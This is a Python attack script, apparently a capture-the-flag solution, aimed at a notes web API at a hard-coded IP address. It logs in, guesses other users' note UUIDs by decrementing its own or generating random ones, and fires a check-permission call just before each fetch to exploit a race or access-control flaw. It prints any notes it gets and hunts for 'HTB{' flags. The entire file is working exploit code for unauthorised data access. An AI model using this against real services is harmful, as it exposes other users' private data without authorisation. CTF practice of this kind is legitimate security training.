#!/usr/bin/env python3
import requests
import threading
import time
import uuid

BASE_URL = "http://83.136.255.203:47148"

# Login
r = requests.post(f"{BASE_URL}/api/auth/login", 
                 json={"email": "test@test.com", "password": "test123"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

# Get my notes
my_notes = requests.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes']
my_note = my_notes[0]['id']

print(f"[*] My note: {my_note}")

# Try UUIDs that might have been created BEFORE my account
# Try sequential UUIDs before mine
base_uuid_parts = my_note.split('-')

# Try variations
test_uuids = []

# Generate UUIDs that might be "earlier" 
for i in range(100):
    # Try with lower first segment
    first_part = hex(int(base_uuid_parts[0], 16) - i)[2:].zfill(8)
    test_uuid = f"{first_part}-{base_uuid_parts[1]}-{base_uuid_parts[2]}-{base_uuid_parts[3]}-{base_uuid_parts[4]}"
    test_uuids.append(test_uuid)

# Also try completely random UUIDs that might exist
for _ in range(50):
    test_uuids.append(str(uuid.uuid4()))

print(f"[*] Testing {len(test_uuids)} UUIDs with ultra-fast race condition...")

results = []

def check_and_get(target_uuid):
    # Call check-permission
    requests.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", headers=headers)
    # IMMEDIATELY get target
    r = requests.get(f"{BASE_URL}/api/notes/{target_uuid}", headers=headers)
    return r.json()

# Use threading for even faster execution
found = []
for i, target_uuid in enumerate(test_uuids[:100]):
    result = check_and_get(target_uuid)
    
    if result.get('success'):
        print(f"\n[!!!] FOUND NOTE {i}: {target_uuid}")
        print(f"     Content: {result.get('note', {})}")
        found.append(result)
        
        if 'HTB{' in str(result) or 'flag' in str(result).lower():
            print(f"\n[!!!] POSSIBLE FLAG FOUND!")
            print(result)
    
    if i % 10 == 0:
        print(f"  Tested {i}/{len(test_uuids[:100])} UUIDs...")
    
    time.sleep(0.05)

print(f"\n[*] Found {len(found)} notes")
for note in found:
    print(note)
